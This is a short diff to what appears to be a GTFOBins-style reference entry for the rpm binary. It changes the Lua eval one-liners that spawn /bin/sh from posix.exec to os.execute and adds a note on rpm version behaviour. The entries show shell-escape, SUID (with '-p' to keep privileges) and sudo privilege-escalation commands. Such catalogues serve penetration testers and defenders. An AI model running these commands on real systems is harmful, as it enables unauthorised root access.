@@ -1,9 +1,11 @@
 ---
 functions:
   shell:
-    - code: rpm --eval '%{lua:posix.exec("/bin/sh")}'
+    - description: |
+        From rpm versions 4.9.0 and on, posix.exec() will return an error unless called from a child process created with posix.fork(). os.execute() may be used instead.
+    - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
   suid:
-    - code: ./rpm --eval '%{lua:posix.exec("/bin/sh", "-p")}'
+    - code: ./rpm --eval '%{lua:os.execute("/bin/sh", "-p")}'
   sudo:
     - code: sudo rpm --eval '%{lua:posix.exec("/bin/sh")}'
     - description: |
